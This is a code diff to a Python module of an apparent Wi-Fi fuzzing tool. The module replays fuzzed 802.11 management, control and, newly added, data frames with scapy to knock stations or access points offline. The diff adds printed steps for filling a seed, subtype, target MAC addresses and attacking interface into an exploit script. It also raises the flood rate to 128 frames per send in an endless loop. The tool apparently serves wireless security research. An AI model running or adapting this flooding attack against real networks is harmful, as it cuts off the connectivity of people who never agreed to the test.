@@ -1,6 +1,7 @@
 from scapy.all import sendp
 from fuzzer_init import *
-from Mngmt_frames.Construct_frame_fields import NUM_OF_FRAMES_TO_SEND, bcolors
+from Mngmt_frames.Construct_frame_fields import NUM_OF_FRAMES_TO_SEND
+from Msgs_colors import bcolors
 from Connection_monitors.DeauthMonitor import DeauthMon
 from Connection_monitors.AlivenessCheck import AllvCheck
 from ascii_art import dos_attack, wifi
@@ -24,7 +25,7 @@ def DoS_attack_init(file_list, mode, frames_dir):
     subprocess.call(['clear'], shell=True)
     print(dos_attack)
     print('\n---------------------------------------------------------------------------------------------------------------------\n')
-    if mode == 1 or mode == 3:
+    if mode == 1:
         for file in file_list:
             if 'Aliveness'in file:
                 chosen_files_list.append(file)
@@ -80,6 +81,24 @@ def print_exploit(frame, frame_type):
         print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
         input(f"{bcolors.OKCYAN}Press enter to continue to the next seed: {bcolors.ENDC}\n")
         subprocess.call(['clear'], shell=True)
+    elif frame_type == 3:
+        print(bcolors.OKGREEN + "\n----You may got yourself an exploit----" + bcolors.ENDC)
+        subtype = int(int.from_bytes(frame[8:9], "big") / 16)
+        if frame[32:38] == frame[18:24]:
+            print(f'\n{frame[38:]}\n')
+        else:
+            print(f'\n{frame[32:]}\n')     
+        print('Copy the above seed to the exploit.py file and replace it with the field ' + bcolors.OKBLUE + '{SEED}' + bcolors.ENDC)
+        print('Replace ' + bcolors.OKBLUE + '{SUBTYPE} ' + bcolors.ENDC + f'with {subtype}')
+        print('Replace ' + bcolors.OKBLUE + '{FCf} ' + bcolors.ENDC + 'with ' + f'{int.from_bytes(frame[9:10], "big")}')
+        print('Replace' + bcolors.OKBLUE + '{SC} ' + bcolors.ENDC + 'with ' + f'{int.from_bytes(frame[30:32], "big")}')
+        print('\nAlso do the replacements:')
+        print(bcolors.OKBLUE + '{DESTINATION_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA, ' + bcolors.OKBLUE + '{SOURCE_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA')
+        print('\nFinally, replace' + bcolors.OKBLUE + ' {ATT_INTERFACE}' + bcolors.ENDC + ' with your WNIC attacking interface')
+        print(f'\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}sudo python3 exploit_data.py{bcolors.ENDC}')
+        print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
+        input(f"{bcolors.OKCYAN}Press enter to continue to the next seed: {bcolors.ENDC}\n")
+        subprocess.call(['clear'], shell=True)
     
 def send_frames(frames_list, mode, frame_type):
     counter = 0
@@ -92,7 +111,7 @@ def send_frames(frames_list, mode, frame_type):
         for frame in frames_list:
             print(f'Sending {num_of_frames} frames of the {counter + 1} seed..')
             for _ in range(0, num_of_frames):
-                sendp(frame, count=1, iface=att_interface, verbose=0)
+                sendp(frame, count=16, iface=att_interface, verbose=0)
                 if not settings.is_alive:
                     print_exploit(frame, frame_type)
                     sleep(10)
@@ -116,15 +135,7 @@ def send_frames(frames_list, mode, frame_type):
         print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
         while True:
             for frame in frames_list:
-                sendp(frame, count=1, iface=att_interface, verbose=0)
-    elif mode == 3:
-        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
-        print(bcolors.OKGREEN + "Launching the attack...." + bcolors.ENDC)
-        print(bcolors.OKGREEN + "Stop the attack with Ctrl+c" + bcolors.ENDC)
-        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
-        while True:
-            for frame in frames_list:
-                sendp(frame, count=NUM_OF_FRAMES_TO_SEND, iface=att_interface, verbose=0)
+                sendp(frame, count=128, iface=att_interface, verbose=0)
     else:
         print(bcolors.FAIL + '\nNo such choice :(' + bcolors.ENDC)
         os._exit(0)
@@ -136,7 +147,6 @@ print('\t\tThis module launches a DoS attack based on the data (log files) colle
 print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
 print('1) Frames detected at the moment of STA connectivity disruption, one-by-one')
 print('2) Sequence of frames till the moment a disruption was detected ' + bcolors.WARNING + '(BETA)' + bcolors.ENDC)
-print('3) Frames detected at the moment of STA connectivity disruption ' + bcolors.WARNING + '(BETA)' + bcolors.ENDC + '\n\n')
 try:
     choice = int(input('Select the type of frames you wish to attack with: '))
 except:
@@ -146,7 +156,8 @@ subprocess.call(['clear'], shell=True)
 print(dos_attack)
 print('\n---------------------------------------------------------------------------------------------------------------------\n')
 print('1) Management Frames')
-print('2) Control Frames\n\n')
+print('2) Control Frames')
+print('3) Data Frames ' + bcolors.WARNING + '(BETA)' + bcolors.ENDC)
 try:
     choice1 = int(input('Select the type of the frames: '))
 except:
@@ -159,6 +170,9 @@ if choice1 == 1:
 elif choice1 == 2:
     file_list = os.listdir(current_dir + "/Logs/fuzz_ctrl_frames")
     frames_dir = "/Logs/fuzz_ctrl_frames/"
+elif choice1 == 3:
+    file_list = os.listdir(current_dir + "/Logs/fuzz_data_frames")
+    frames_dir = "/Logs/fuzz_data_frames/"
 else:
     print(bcolors.FAIL + '\nNo such choice :(' + bcolors.ENDC)
     os._exit(0)
